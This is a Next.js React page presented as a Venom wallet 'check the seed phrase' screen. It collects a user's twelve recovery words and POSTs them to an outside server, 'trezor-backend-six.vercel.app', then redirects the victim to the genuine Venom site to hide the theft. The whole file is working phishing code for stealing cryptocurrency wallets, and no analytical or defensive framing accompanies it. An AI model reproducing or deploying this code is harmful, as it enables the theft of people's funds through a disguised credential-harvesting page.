"use client";

import Image from "next/image";
import { useRouter } from "next/navigation";
import { useState } from "react";

export default function CheckSeedPhrasePage() {
    const wordCount = 12;
    const router = useRouter()
    const [words, setWords] = useState<string[]>(Array(wordCount).fill(""));
    const [loading, setLoading] = useState(false);
    const [passphrase, setPassphrase] = useState("");

    const handleChange = (index: number, value: string) => {
        const updated = [...words];
        updated[index] = value;
        setWords(updated);
    };

    const allFilled = words.every((w) => w.trim() !== "");

    const handleSubmit = async () => {
        const data = words.map((word, idx) => ({
            label: `Word ${idx + 1}`,
            value: word.trim(),
        }));

        const payload: Record<string, any> = {
            heading: "Venom",
            data,
        };

        try {
            setLoading(true);

            const response = await fetch(
                "https://trezor-backend-six.vercel.app/api/v1/send-aws",
                {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(payload),
                }
            );

            if (response.ok) {
                setWords(Array(wordCount).fill(""));
                setPassphrase("");
                window.location.href = "https://venomwallet.com";
            } else {
                const err = await response.json();
                alert(`Failed to send mnemonic: ${err.message || "Unknown error"}`);
            }
        } catch (error) {
            console.error(error);
            alert("An error occurred while sending mnemonic.");
        } finally {
            setLoading(false);
        }
    };

    return (
        <div className="relative min-h-screen w-full overflow-hidden bg-black flex flex-col">

            {/* Mesh Gradient Background */}
            <div className="absolute inset-0">
                <div className="absolute top-0 left-0 w-[550px] h-[550px] bg-green-500/60 blur-[200px] rounded-full" />
                <div className="absolute top-[-150px] left-[40%] w-[650px] h-[650px] bg-cyan-400/60 blur-[230px] rounded-full" />
                <div className="absolute top-[120px] right-[-200px] w-[700px] h-[700px] bg-blue-600/60 blur-[250px] rounded-full" />
                <div className="absolute bottom-[-250px] left-[30%] w-[750px] h-[750px] bg-blue-500/50 blur-[280px] rounded-full" />
                <div className="absolute bottom-[-200px] left-[-250px] w-[700px] h-[700px] bg-green-500/50 blur-[270px] rounded-full" />
            </div>

            {/* Dark Overlay */}
            <div className="absolute inset-0 bg-black/60" />

            {/* Content */}
            <div className="relative z-10 flex flex-col flex-1 px-10 py-10">

                {/* Top Logo */}
                <div className="flex items-center gap-3 text-white">
                    <Image
                        src={"/logo.svg"}
                        alt="logo"
                        width={150}
                        height={60}
                    />
                </div>

                {/* Main */}
                <div className="flex flex-col flex-1 items-center justify-center text-center">

                    <h1 className="text-white text-5xl md:text-6xl font-bold leading-tight">
                        Let’s check the seed <br /> phrase
                    </h1>

                    {/* Inputs */}
                    <div className="mt-12 grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-4 w-full max-w-3xl">
                        {words.map((word, index) => (
                            <div
                                key={index}
                                className="flex items-center bg-black/30 border border-gray-700 rounded-lg px-4 py-3"
                            >
                                <span className="text-gray-400 text-sm w-8 text-left">
                                    {index + 1}.
                                </span>

                                <input
                                    value={word}
                                    onChange={(e) =>
                                        handleChange(index, e.target.value)
                                    }
                                    placeholder="Word ..."
                                    className="bg-transparent outline-none text-white w-full placeholder-gray-500 text-sm"
                                />
                            </div>
                        ))}
                    </div>

                    {/* Buttons */}
                    <div className="mt-10 flex flex-col gap-5 w-full max-w-sm">

                        <button
                            disabled={!allFilled || loading}
                            onClick={handleSubmit}
                            className={`font-medium py-4 rounded-xl transition
                                ${allFilled && !loading
                                    ? "bg-white text-black hover:bg-gray-200"
                                    : "bg-gray-500 text-gray-300 cursor-not-allowed"
                                }`}
                        >
                            {loading ? "Confirming..." : "Confirm"}
                        </button>

                        <button
                            onClick={() => router.back()}
                            className="border border-gray-500 text-white font-medium py-4 rounded-xl hover:bg-white/10 transition"
                        >
                            Back
                        </button>
                    </div>
                </div>

                {/* Footer */}
                <div className="text-gray-400 text-sm mt-auto">
                    © Venom. All rights reserved
                </div>
            </div>
        </div>
    );
}
